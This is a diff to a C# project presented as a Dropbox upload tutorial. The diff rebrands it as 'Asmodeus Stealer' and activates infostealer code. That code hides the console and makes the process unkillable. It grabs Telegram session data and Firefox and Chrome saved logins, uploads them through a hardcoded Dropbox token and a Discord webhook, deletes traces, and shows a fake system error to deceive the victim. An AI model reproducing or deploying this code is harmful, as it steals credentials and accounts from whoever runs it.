@@ -17,13 +17,15 @@ using CommandLine;
 
 namespace UploadAFile
 {
-    /// <summary>
-    /// This program will teach you how to upload a file to dropbox account and get its sharable download link.
-    /// </summary>
+    /* 
+       │ Author       : Kingsman
+       │ Name         : Asmodeus Stealer
+       │ Contact Me   : https:github.com/exploitblizzard
+       This program Is distributed for educational purposes only.
+*/
     class Program
     {
-        /*
-        // hide console window at start
+        
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
 
@@ -32,11 +34,10 @@ namespace UploadAFile
 
         const int SW_HIDE = 0;
         const int SW_SHOW = 5;
-        static string token = "u9_-dQ3TjL4AAAAAAAAAASPT4CQ-YTx39865ksbX8nMgC1gp_oEt0bqFPtSD21w7";*/
+        static string token = "u9_-dQ3TjL4AAAAAAAAAASPT4CQ-YTx39865ksbX8nMgC1gp_oEt0bqFPtSD21w7";
         static void Main(string[] args)
         {
-            /*
-           // You can't kill me
+            
             int isCritical = 1;
             int BreakOnTermination = 0x1D;
 
@@ -69,7 +70,7 @@ namespace UploadAFile
                 string4 = "N/A";
             }
             */
-            /*
+            
             #endregion
             
             //sending message to discord webhook
@@ -86,7 +87,7 @@ namespace UploadAFile
                 }
             }
             
-            //Telegram Stealer 
+            
             var userName = Environment.UserName;
             foreach (var process in Process.GetProcessesByName("telegram"))
             {
@@ -113,7 +114,7 @@ namespace UploadAFile
                 }
                 ZipFile.CreateFromDirectory(UWPpath, zipPath);
             }
-         */
+         
             // Firefox and Chrome stealer
             Console.ForegroundColor = ConsoleColor.Cyan;
             Console.WriteLine("Exploit Blizzard");
@@ -130,7 +131,7 @@ namespace UploadAFile
             //var result = parser.ParseArguments<Options>(args)
             // .WithParsed(parsed => opts = parsed);
 
-            // parser.Dispose();*/
+            // parser.Dispose();
             var userName = Environment.UserName;
             var storedpass = "C:\\Users\\"+ userName +"\\AppData\\Local\\Temp\\blizzard.txt";
             List<BrowserLoginData> loginDataList = new List<BrowserLoginData>();
@@ -181,23 +182,23 @@ namespace UploadAFile
                 */
 
 
-            /*
+            
             var task = Task.Run((Func<Task>)Program.Run);
             task.Wait();
             Console.ReadKey();
             
-            File.Delete(zipPath);*/
+            File.Delete(zipPath);
 
-            /*
+            
             var fakeError = "This program failed to start because window.dll was not found, Reinstalling the program may fix the problem.";
             var fakeTitle = "TelegramStealer.exe - System Error";
-            MessageBox.Show(fakeError, fakeTitle);*/
+            MessageBox.Show(fakeError, fakeTitle);
         }
         
         
 
 
-        /*
+        
         #region grabbingIP
         static string GetIPAddress()
         {
@@ -306,7 +307,7 @@ namespace UploadAFile
                 Console.Write(url);
             }
         }
-        */
+        
         
     }
 }
